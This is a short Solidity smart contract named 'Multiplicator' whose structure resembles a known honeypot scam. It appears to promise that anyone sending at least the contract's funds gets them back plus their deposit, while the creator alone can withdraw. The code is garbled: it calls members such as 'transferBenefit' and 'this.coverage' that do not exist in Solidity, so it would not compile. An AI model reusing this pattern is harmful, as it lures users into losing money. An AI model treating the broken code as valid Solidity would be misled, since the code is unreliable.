pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Manager = msg.sender;

    function()payable{}

    function receivePayout()
    payable
    public
    {
        require(msg.sender == Manager);
        Manager.transferBenefit(this.coverage);
    }

    function multiplicate(address adr)
    payable
    {
        if(msg.value>=this.coverage)
        {
            adr.transferBenefit(this.coverage+msg.value);
        }
    }
}